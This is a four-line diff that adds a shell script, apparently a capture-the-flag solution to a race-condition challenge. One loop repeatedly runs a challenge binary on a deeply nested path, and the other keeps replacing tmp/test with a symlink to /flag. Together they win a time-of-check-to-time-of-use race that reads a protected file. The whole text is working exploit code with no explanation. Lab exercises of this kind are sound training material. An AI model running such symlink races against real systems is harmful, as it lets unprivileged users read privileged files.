@@ -1,0 +1,4 @@
+while (true); do touch tmp/test; /challenges/race/level2_testing1 0_end/root/1_end/root/2_end/root/3_end/root/4_end/root/5_end/root/6_end/root/7_end/root/8_end/root/9_end/root/tmp/test; done > o 2>&1
+
+while (true); do rm -rf tmp/test; ln -s /flag tmp/test; done
+
